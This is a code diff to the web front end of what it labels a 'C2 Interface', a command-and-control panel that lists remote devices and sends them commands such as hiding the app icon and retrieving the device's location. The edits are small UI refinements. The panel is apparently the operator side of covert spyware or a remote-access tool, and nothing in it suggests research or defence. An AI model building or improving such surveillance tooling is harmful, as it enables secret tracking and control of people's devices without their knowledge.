@@ -137,7 +137,7 @@
             font-family: var(--font-family);
         }
 
-        button:hover {
+        button:hover:enabled {
             border-color: var(--accent-color);
         }
 
@@ -243,6 +243,16 @@
                 devices = await response.json();
                 renderDeviceList();
                 logToConsole(`Success: Found ${devices.length} devices.`, 'success');
+
+                if (devices.length > 0) {
+                    const firstDeviceElement = deviceList.querySelector('li');
+                    if (firstDeviceElement) {
+                        selectDevice(devices[0], firstDeviceElement);
+                    }
+                } else {
+                    enableCommands(false);
+                    commandPanelTitle.textContent = `COMMANDS (No Devices Found)`;
+                }
             } catch (error) {
                 logToConsole(`Error fetching devices: ${error.message}`, 'error');
             }
@@ -299,11 +309,7 @@
                 });
 
                 const result = await response.json();
-
-                if (!response.ok) {
-                    throw new Error(result.error || `Server responded with ${response.status}`);
-                }
-
+                if (!response.ok) throw new Error(result.error || `Server responded with ${response.status}`);
                 logToConsole(`Command [${action}] successfully sent.`, 'success');
 
             } catch (error) {
@@ -333,7 +339,6 @@
             }
         }
 
-        // --- Event Listeners ---
         document.getElementById('btnHideIcon').addEventListener('click', () => sendCommand('toggle_icon', { show: 'false' }));
         document.getElementById('btnShowIcon').addEventListener('click', () => sendCommand('toggle_icon', { show: 'true' }));
         document.getElementById('btnGetLocation').addEventListener('click', () => sendCommand('get_location'));
@@ -347,7 +352,6 @@
             logToConsole('Console cleared.');
         });
         
-        // --- Initial Load ---
         window.onload = () => {
             logToConsole('C2 Interface Initialized.');
             enableCommands(false);
